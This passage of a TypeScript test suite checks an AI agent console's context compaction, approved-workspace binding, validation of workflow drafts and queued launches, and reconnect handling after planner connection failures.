    expect(ev.tokensBefore).toBeGreaterThanOrEqual(90_000);
    expect(ev.tokensAfter).toBeLessThan(ev.tokensBefore);
    expect(ev.contextWindowTokens).toBe(100_000);
    expect(ev.compactionNumber).toBe(1);
    expect(ev.summaryText.length).toBeGreaterThan(0);
    // Before/after counts are coherent and history actually shrank.
    expect(ev.messagesBefore).toBe(beforeLen + 1); // + this turn's user push
    expect(ev.messagesAfter).toBeLessThan(ev.messagesBefore);
    expect(ev.preCompactionMessages).toHaveLength(ev.messagesBefore);
    // messages[0] is preserved verbatim and a summary marker was inserted.
    expect(session.messages[0]).toEqual(originalFirst);
    expect(hasSummaryMarker(session.messages)).toBe(true);
    // The tail is preserved: the last pre-compaction message (this turn's user
    // line) survives verbatim in the rewritten history. It is no longer LAST —
    // the turn's planner call appended an assistant reply after compaction — so
    // assert presence rather than position.
    const tailMsg = ev.preCompactionMessages.at(-1)!;
    expect(session.messages).toContainEqual(tailMsg);
    expect(runtime.summarizerCalls).toBe(1);
  });

  it("does not compact below the threshold", async () => {
    const runtime = new CompactionRuntime(50_000); // < 80k threshold
    const session = createConsoleSession(baseConfig(runtime));
    await session.ready;
    const events: unknown[] = [];
    const cbs = { onCompaction: () => events.push(1) };
    await session.send("one", cbs);
    await session.send("two", cbs);
    expect(events).toHaveLength(0);
    expect(runtime.summarizerCalls).toBe(0);
    expect(hasSummaryMarker(session.messages)).toBe(false);
  });

  it("does not compact small initial history before any usage sample", async () => {
    const runtime = new CompactionRuntime(90_000);
    const session = createConsoleSession(baseConfig(runtime));
    await session.ready;
    const events: unknown[] = [];
    await session.send("only turn", { onCompaction: () => events.push(1) });
    expect(events).toHaveLength(0);
    expect(runtime.summarizerCalls).toBe(0);
  });

  it("does not compact when compaction is disabled", async () => {
    const runtime = new CompactionRuntime(90_000);
    const session = createConsoleSession(baseConfig(runtime, { compaction: { enabled: false, thresholdFraction: 0.80 } }));
    await session.ready;
    const events: unknown[] = [];
    const cbs = { onCompaction: () => events.push(1) };
    await session.send("one", cbs);
    await session.send("two", cbs);
    expect(events).toHaveLength(0);
    expect(runtime.summarizerCalls).toBe(0);
  });

  it("stands down when the runtime performs server-side compaction", async () => {
    const runtime = new CompactionRuntime(90_000, { serverSide: true });
    const session = createConsoleSession(baseConfig(runtime));
    await session.ready;
    const events: unknown[] = [];
    const cbs = { onCompaction: () => events.push(1) };
    await session.send("one", cbs);
    await session.send("two", cbs);
    expect(events).toHaveLength(0);
    expect(runtime.summarizerCalls).toBe(0);
    expect(hasSummaryMarker(session.messages)).toBe(false);
  });

  it("leaves history unchanged and stops on a generic summarizer failure", async () => {
    const runtime = new CompactionRuntime(90_000, { summarizerThrows: true });
    const session = createConsoleSession(baseConfig(runtime));
    await session.ready;
    const events: import("./turn-engine.js").ConsoleCompactionEvent[] = [];
    const cbs = { onCompaction: (e: import("./turn-engine.js").ConsoleCompactionEvent) => events.push(e) };

    await session.send("first operator line", cbs);
    // Snapshot the anchor set that must survive an un-applied (degraded) attempt.
    const outcome = await session.send("second operator line", cbs);
    expect(outcome.stopReason).toBe("error");
    expect(outcome.error).toContain("summarizer unavailable");
    expect(runtime.plannerCalls).toBe(1);
    expect(events).toHaveLength(0);
    expect(hasSummaryMarker(session.messages)).toBe(false);
    expect(session.messages.some((m) => m.content.some((b) => b.type === "text" && b.text.includes("FIRST-ANCHOR")))).toBe(true);
  });
});

describe("operator-approved workspace configuration", () => {
  it("binds shell cwd and checkpoint context to the approved folder while keeping action approval", async () => {
    const directory = realpathSync(mkdtempSync(join(tmpdir(), "zero-engine-workspace-")));
    const approveTool = vi.fn(async () => true);
    const requestLocalScope = vi.fn(async () => null);
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "workspace-pwd", name: "bash", input: { command: "pwd" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Done"),
    ]);
    const session = createConsoleSession({ runtime, role: "discovery", autonomyMode: "standard", refineObjective: false, approveTool, requestLocalScope });
    try {
      await session.ready;
      expect(() => session.configureWorkspace("/")).toThrow("unprotected");
      expect(session.localScopePath).toBeUndefined();
      session.configureWorkspace(directory);
      const result = await session.send("Check your directory");
      expect(result.toolCalls[0]!.result.success).toBe(true);
      expect(String(result.toolCalls[0]!.result.output).trim()).toBe(directory);
      expect(approveTool).toHaveBeenCalled();
      expect(requestLocalScope).not.toHaveBeenCalled();
      expect(session.exportCheckpoint()).toMatchObject({ workspaceRoot: directory, localScopePath: directory });
    } finally { await session.cleanup(); rmSync(directory, { recursive: true, force: true }); }
  });
});


describe("console workflow draft authoring", () => {
  const input: SecurityWorkflowInput = {
    name: "Dependency review", instructions: "Review dependency vulnerabilities and report verified findings.", target: "source:/fixture",
    nodes: [
      { id: "start", type: "trigger", label: "Manual start", enabled: true },
      { id: "audit", type: "audit", label: "Dependency review", enabled: true, plan: DEFAULT_SECURITY_WORKFLOW_PLAN, execution: { instructions: "Inspect manifests without running shell commands.", allowedAgentTools: ["read_file"] } },
      { id: "report", type: "report", label: "Report", enabled: true },
    ], edges: [{ source: "start", target: "audit" }, { source: "audit", target: "report" }],
  };
  const saved: SecurityWorkflow = { ...input, id: "workflow-fixture", revision: 1, createdAt: "2026-09-30T00:00:00Z", updatedAt: "2026-09-30T00:00:00Z" };

  it("refreshes skill editor context after customizing a read-only source", async () => {
    let current = { id: "builtin/source-review", name: "source-review", revision: "a".repeat(64), writable: false };
    const runtime = new ScriptedRuntime([endTurn("Copied."), endTurn("Saved.")]);
    const session = createConsoleSession({ runtime, refineObjective: false, skillEditor: { read: () => current } });
    try {
      await session.send("Customize the skill");
      expect(runtime.calls[0]?.system).toContain('skill "builtin/source-review"');
      expect(runtime.calls[0]?.system).toContain("copy_skill");
      expect(runtime.calls[0]?.system).toContain("preserving all supporting resources");
      current = { ...current, id: "workspace/custom-review", revision: "b".repeat(64), writable: true };
      await session.send("Refine the instructions");
      expect(runtime.calls[1]?.system).toContain('skill "workspace/custom-review"');
      expect(runtime.calls[1]?.system).toContain("save_skill");
      expect(runtime.calls[1]?.system).toContain("Skill edits never execute its scripts");
    } finally { await session.cleanup(); }
  });

  it("refreshes bound workflow revision for ordinary chat edits without running it", async () => {
    let current = saved;
    const runtime = new ScriptedRuntime([endTurn("Updated."), endTurn("Updated again.")]);
    const session = createConsoleSession({ runtime, refineObjective: false, workflowAuthoring: { list: () => [current], save: () => current, editor: { id: saved.id, read: () => current } } });
    try {
      await session.send("Rename the dependency step.");
      expect(runtime.calls[0]?.system).toContain('workflow "workflow-fixture" at current revision 1');
      expect(runtime.calls[0]?.system).toContain("ordinary chat messages describe changes to this workflow");
      expect(runtime.calls[0]?.system).toContain("Editing never runs the workflow, enables a schedule");
      current = { ...saved, revision: 2 };
      await session.send("Also review lockfiles.");
      expect(runtime.calls[1]?.system).toContain("current revision 2");
      expect(runtime.calls[1]?.system).not.toContain("current revision 1");
    } finally { await session.cleanup(); }
  });

  it.each([undefined, []] as const)("preserves omitted versus empty agent tool restrictions (%s)", async allowedAgentTools => {
    const draft: SecurityWorkflowInput = { ...input, nodes: input.nodes.map(node => node.type === "audit" ? { ...node, execution: { instructions: "", ...(allowedAgentTools === undefined ? {} : { allowedAgentTools: [...allowedAgentTools] }) } } : node) };
    const save = vi.fn((value: SecurityWorkflowInput) => ({ ...saved, nodes: value.nodes }));
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "restricted-draft", name: "console_save_workflow", input: { ...draft } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Draft saved."),
    ]);
    const session = createConsoleSession({ runtime, workflowAuthoring: { list: () => [], save } });
    try {
      await session.send("Save the stage tool restriction as a draft.");
      expect(save).toHaveBeenCalledOnce();
      const execution = save.mock.calls[0]?.[0].nodes.find(node => node.type === "audit")?.execution;
      expect(execution?.allowedAgentTools).toEqual(allowedAgentTools);
      expect(Object.hasOwn(execution ?? {}, "allowedAgentTools")).toBe(allowedAgentTools !== undefined);
    } finally { await session.cleanup(); }
  });

  it("does not advertise authoring tools without a caller-owned draft store", async () => {
    const runtime = new ScriptedRuntime([endTurn("Ready.")]);
    const session = createConsoleSession({ runtime });
    try {
      await session.send("Hello.");
      expect(runtime.calls[0]?.tools.some(tool => tool.name.startsWith("console_save_workflow") || tool.name === "console_list_workflows")).toBe(false);
      expect(runtime.calls[0]?.system).not.toContain("console_save_workflow");
    } finally { await session.cleanup(); }
  });

  it("rejects executable or unbounded draft payloads before storage", async () => {
    const save = vi.fn((_input: SecurityWorkflowInput) => saved);
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "invalid-draft", name: "console_save_workflow", input: { ...input, command: "execute shell", schedule: "every minute" } }], stopReason: "tool_use", durationMs: 1 },
      { content: [{ type: "tool_use", id: "oversized-draft", name: "console_save_workflow", input: { ...input, instructions: "x".repeat(16_001) } }], stopReason: "tool_use", durationMs: 1 },
      { content: [{ type: "tool_use", id: "wrong-stage", name: "console_save_workflow", input: { ...input, nodes: input.nodes.map(node => node.type === "trigger" ? { ...node, execution: { instructions: "Execute this trigger" } } : node) } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("No draft saved."),
    ]);
    const session = createConsoleSession({ runtime, workflowAuthoring: { list: () => [], save } });
    try {
      await session.send("Draft a workflow.");
      expect(save).not.toHaveBeenCalled();
      const result = runtime.calls[1]?.messages.flatMap(message => message.content).find(block => block.type === "tool_result");
      expect(result && "is_error" in result ? result.is_error : false).toBe(true);
    } finally { await session.cleanup(); }
  });
});

describe("caller-owned workflow lifecycle tools", () => {
  it("dispatches discovery and queued launch without starting a scan inside the turn", async () => {
    const invoke = vi.fn(async (name: string) => name === "list_templates" ? [{ id: "repository-review", revision: 1 }] : { requestId: "queued-1", status: "queued" });
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "templates-1", name: "list_templates", input: {} }], stopReason: "tool_use", durationMs: 1 },
      { content: [{ type: "tool_use", id: "launch-1", name: "start_run", input: { templateId: "repository-review", target: "/fixture" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("The workflow is queued for launch approval after this turn."),
    ]);
    const session = createConsoleSession({ runtime, refineObjective: false, workflowLifecycle: { invoke } });
    try {
      await session.send("Run the repository review workflow");
      expect(invoke).toHaveBeenCalledWith("list_templates", {});
      expect(invoke).toHaveBeenCalledWith("start_run", { templateId: "repository-review", target: "/fixture" });
      expect(session.tools.map(tool => tool.name)).toEqual(expect.arrayContaining(["list_templates", "start_run", "get_run", "get_run_results", "cancel_run"]));
      expect(runtime.calls[0]!.tools.map(tool => tool.name)).not.toContain("start_run");
      expect(runtime.calls[0]!.system).toContain("queued requestId");
      const result = runtime.calls[2]!.messages.flatMap(message => message.content).find(block => block.type === "tool_result" && block.tool_use_id === "launch-1");
      expect(result && "content" in result ? result.content : "").toContain('"status":"queued"');
    } finally { await session.cleanup(); }
  });
});

describe("console planner reconnect", () => {
  const disconnected: NativeRuntimeResult = { content: [], stopReason: "error", durationMs: 0,
    error: "OpenRouter API error: OpenRouter transport failure [ECONNRESET]: The connection closed before a complete response was received. Request outcome may be unknown. Automatic replay is disabled" };

  it("retains completed tools exactly once across an unknown-outcome reconnect", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "saved-plan", name: "update_todos", input: { todos: [{ content: "Retain the checked source", status: "in_progress" }] } }], stopReason: "tool_use", durationMs: 0, usage: { inputTokens: 2, outputTokens: 1 } },
      disconnected, { ...endTurn("Finished from retained results"), usage: { inputTokens: 3, outputTokens: 1 } },
    ]);
    const session = createConsoleSession({ runtime, refineObjective: false });
    const starts = vi.fn(); const usage = vi.fn(); const notice = vi.fn();
    try {
      const result = await session.send("Review", { onToolStart: starts, onUsage: usage, onNotice: notice });
      expect(result.stopReason).toBe("end_turn");
      expect(starts).toHaveBeenCalledTimes(1);
      expect(runtime.calls).toHaveLength(3);
      expect(runtime.calls[2].messages).toEqual(runtime.calls[1].messages);
      expect(JSON.stringify(runtime.calls[2].messages)).toContain("saved-plan");
      expect(usage.mock.calls.filter(([value]) => value.kind === "planner" && value.usageUnavailable === true)).toHaveLength(1);
      expect(notice).toHaveBeenCalledWith("Connection interrupted; reconnecting…");
    } finally { await session.cleanup(); }
  });

  it("reconnects a thrown socket failure without committing incomplete function calls", async () => {
    const runtime = new ScriptedRuntime([endTurn("Recovered")]);
    const execute = runtime.executeNative.bind(runtime);
    let calls = 0;
    runtime.executeNative = async (...args) => {
      if (++calls === 1) throw new Error(disconnected.error);
      return execute(...args);
    };
    const session = createConsoleSession({ runtime, refineObjective: false });
    const starts = vi.fn();
    try {
      const result = await session.send("Review", { onToolStart: starts });
      expect(result.stopReason).toBe("end_turn");
      expect(calls).toBe(2);
      expect(starts).not.toHaveBeenCalled();
      expect(session.messages.filter(message => message.role === "assistant")).toHaveLength(1);
    } finally { await session.cleanup(); }
  });

  it("discards partial tools attached to an interrupted inference result", async () => {
    const runtime = new ScriptedRuntime([{ ...disconnected,
      content: [{ type: "tool_use", id: "incomplete", name: "update_todos", input: { todos: [] } }] }, endTurn("Recovered")]);
    const session = createConsoleSession({ runtime, refineObjective: false });
    const starts = vi.fn();
    try {
      const result = await session.send("Review", { onToolStart: starts });
      expect(result.stopReason).toBe("end_turn");
      expect(starts).not.toHaveBeenCalled();
      expect(JSON.stringify(runtime.calls[1].messages)).not.toContain("incomplete");
    } finally { await session.cleanup(); }
  });

  it("stops reconnect backoff immediately on operator cancellation", async () => {
    const runtime = new ScriptedRuntime([disconnected]);
    const controller = new AbortController();
    const session = createConsoleSession({ runtime, refineObjective: false });
    try {
      const result = await session.send("Review", { onNotice: () => controller.abort() }, { signal: controller.signal });
      expect(result.stopReason).toBe("cancelled");
      expect(runtime.calls).toHaveLength(1);
    } finally { await session.cleanup(); }
  });

  it.each(["Unknown tool effect; ECONNRESET", "Harness ECONNRESET", "Request outcome may be unknown. Automatic replay is disabled", "OpenRouter API error 401 unauthorized", "OpenRouter API error 400: body mentions ECONNRESET", "OpenRouter transport failure [unknown]: authentication initialization failed", "HTTP 400 ECONNRESET"])("does not retry unrelated failure %s", async error => {
    const runtime = new ScriptedRuntime([{ ...disconnected, error }]);
    const session = createConsoleSession({ runtime, refineObjective: false });
    try { expect((await session.send("Review")).stopReason).toBe("error"); expect(runtime.calls).toHaveLength(1); }
    finally { await session.cleanup(); }
  });

  it("fails closed when unknown usage cannot be admitted to an explicit allowance", async () => {
    const runtime = new ScriptedRuntime([disconnected]);
    const session = createConsoleSession({ runtime, refineObjective: false, maxTurnTokens: 1_000_000 });
    try {
      const result = await session.send("Review");
      expect(result.stopReason).toBe("error");
      expect(result.error).toContain("Usage for the disconnected planner request is unknown");
      expect(runtime.calls).toHaveLength(1);
    } finally { await session.cleanup(); }
  });
});
